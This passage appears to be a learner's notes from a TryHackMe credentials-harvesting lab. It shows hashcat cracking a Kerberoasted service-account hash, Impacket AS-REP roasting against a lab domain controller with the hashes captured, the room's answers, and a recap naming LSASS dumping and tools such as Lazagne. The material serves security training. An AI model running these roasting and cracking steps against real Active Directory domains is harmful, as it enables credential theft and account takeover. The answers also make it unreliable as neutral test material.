9b8e439b66615a118395e8f7c212f020d9f214d5a580ad1da6292825ebf371b9b073effa5c37cf00339


┌──(kali㉿kali)-[~/Downloads/share]
└─$ nano spn.hash               
                                                                                                         
┌──(kali㉿kali)-[~/Downloads/share]
└─$ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1243/2551 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*svc-thm$THM.RED$THM.red/svc-thm*$e2f90d9d187662c98d741fda9f478691$5c793d3ee975eb20f32215d08c4069b14f920fd06c29450446e1f68fb0f4bc890c43263f92b249e6b7b391c97c63e4b9853004ff7d9453776c1f8922dbcc03e14ff435223d9359d7b9b2cd86b32f5078a05158baa3fb544b60dec619603ca292930833d6f2d0e230fcf3600058bf50fb08d929f9b546a57e73ded4ed9082a38b77e3c319873c400d1f590f2e203b013f173edc5260fdf8a4ecff6e880b9608bdfd8bb4d0f52eb4e48a8662035f4702da2acf9757710a68196642a892fab380bcb9ac189e6e2ee0b804cf182bcf74d834dcae563824afce5f51d25b5a1515c2b13a2362f95e4a1b8678fdbb9fa602c493062f27e8317dbbeefa56934cbf1efb508c0bc9779369095ae4f042ca85aa99fb653cf032b4bb6562d9086efa8161609aecbbf26ac310b6435f3989c35c95a7d2ac1c4b991ab120dd3832c6e015a819bf000e30fe6b85f13ddae26a06b9b3e56481c453779ccc841c711db7884f3d60dd7eb955a55aec1829266813e85b08cdede393f9200bdacfb8bf49e34d09cab258bee9e35eb6929737c9bf6c55dbc54ef47bbed2500c98fd36aec3e112fcfceb97f7d0e2425c1caec8bfff101ac37dfd0a82b93fb78e0c1eae149ad1f6fdff64e82d1775fa60a220fa64d2ca4565f49de878af9c1765ac12e59382536c8ed93d6b10001830e6cd031bdf48b864f6cf0adcd1df56c3068a533f104305d528c224c12acfd4458911b4c8a5378006fffc549685714c80eeb0e5c148ffdb9f3fa45d2f6f1ffb5a6cd082e8d50cf1f1852571285f6feabbeaa16655e7522451d8384010a5a404c7803839fe4e94a867a73dcbda39188e7ff1f47dca2deb58a5008a92be98d514ce986b50d74ab7fb9cfd5562bd8a73e297d26652b28693724df9a30627004fa9fa516c07a8f27dbb82416140cc7062dccce0a8d3a7df1c6a387ed8b246ac3d945809e1b3c087af8079d27fe45fc0f154c1f49efb08c0ec23d0f250b0f51f64cd8fefd8febb8bb66b9c817226252f4b912fc1e54151c57288182ba41389f5267751a6ae56c1553b590df6d075077431e5a8896d5cbdc282ef87879a474048101d3d6ec636e7091519378bc776205dfc1fc6caac51475e7432a49bec050d05126f951701216a99439bf795868e9ad6d1f47be0468af0dc996ea3867c06208ce569442dfc083a7b50ab5e3eca49b8e439b66615a118395e8f7c212f020d9f214d5a580ad1da6292825ebf371b9b073effa5c37cf00339:Passw0rd1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc-thm$THM.RED$THM.red/svc-thm*$e2f90...f00339
Time.Started.....: Mon Sep 26 14:39:56 2022 (0 secs)
Time.Estimated...: Mon Sep 26 14:39:56 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   608.6 kH/s (0.73ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 227328/14344385 (1.58%)
Rejected.........: 0/227328 (0.00%)
Restore.Point....: 226304/14344385 (1.58%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: SOCCER2 -> 920227
Hardware.Mon.#1..: Util: 27%

Started: Mon Sep 26 14:39:52 2022
Stopped: Mon Sep 26 14:39:58 2022




┌──(kali㉿kali)-[~/Downloads/share]
└─$ nano users.lst
                                                                                                         
┌──(kali㉿kali)-[~/Downloads/share]
└─$ cat users.lst                      
Administrator
admin
thm
test
sshd
victim
CREDS-HARVESTIN$
                                                                                                         
┌──(kali㉿kali)-[~/Downloads/share]
└─$ locate GetNPUsers.py  
/home/kali/Downloads/zerologon_learning/impacketEnv/bin/GetNPUsers.py
/usr/share/doc/python3-impacket/examples/GetNPUsers.py
                                                                                                         
┌──(kali㉿kali)-[~/Downloads/share]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.53.63 thm.red/ -usersfile users.lst 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User sshd doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$victim@THM.RED:a68b3bde3bb67452b898a2390187b31a$344c22fa482de80e0acd9a2443e9659e213c72cba7ddca16eb87fb96b05c64700d5198101cabb64c169cbd45518c32e86a25f310460930c220575edffd70f588af48f59c0e313e539844408b2356a06448afbe99b2a85c9daaf14f7f8f5763813ab0b19cf676ff6f046879b947dd8eb3239e3bc35accfe7323ac2bd65dbdd7aa88061738a35505a7721d1267be5ee8266336d4dca96a67e04623d721bae472b62a85459094f5582f99c5cbf1f7089cc76eb2511368dd40cd16d72774d89e46181d463c48992572a01970c65bc64508df5234e6c940bbcf3b7eee98ea43e54f29b0af
[-] User CREDS-HARVESTIN$ doesn't have UF_DONT_REQUIRE_PREAUTH set


┌──(kali㉿kali)-[~/Downloads/share]
└─$ hashcat -a 3 -m 18200 '$krb5asrep$23$victim@THM.RED:a68b3bde3bb67452b898a2390187b31a$344c22fa482de80e0acd9a2443e9659e213c72cba7ddca16eb87fb96b05c64700d5198101cabb64c169cbd45518c32e86a25f310460930c220575edffd70f588af48f59c0e313e539844408b2356a06448afbe99b2a85c9daaf14f7f8f5763813ab0b19cf676ff6f046879b947dd8eb3239e3bc35accfe7323ac2bd65dbdd7aa88061738a35505a7721d1267be5ee8266336d4dca96a67e04623d721bae472b62a85459094f5582f99c5cbf1f7089cc76eb2511368dd40cd16d72774d89e46181d463c48992572a01970c65bc64508df5234e6c940bbcf3b7eee98ea43e54f29b0af' /usr/share/wordlists/rockyou.txt


... long time

```

Enumerate for SPN users using the Impacket GetUserSPNs script. What is the Service Principal Name for the Domain Controller?
*svc-thm*


After finding the SPN account from the previous question, perform the Kerberoasting attack to grab the TGS ticket and crack it. What is the password?
*Passw0rd1*

### Conclusion 



Recap

In this room, we discussed the various approaches to obtaining users' credentials, including the local computer and Domain Controller, which conclude the following:

    We discussed accessing Windows memory, dumping an LSASS process, and extracting authentication hashes.
    We discussed Windows Credentials Manager and methods to extract passwords. 
    We introduced the Windows LAPS feature and enumerated it to find the correct user and target to extract passwords.
    We introduced AD attacks which led to dumping and extracting users' credentials.

The following tools may be worth trying to scan a target machine (files, memory, etc.) for hunting sensitive information. We suggest trying them out in the enumeration stage.

    Snaffler  https://github.com/SnaffCon/Snaffler
    Seatbelt  https://github.com/GhostPack/Seatbelt
    Lazagne   https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/  INTERESTING using metasploit[meterpreter] then upload lazagne.exe (for getting google pass, databases and more)









## Task 7 Domain Controller











## Task 8 Local Administrator Password Solution (LAPS)



## Task 9 Other Attacks



## Task 10 Conclusion 
        


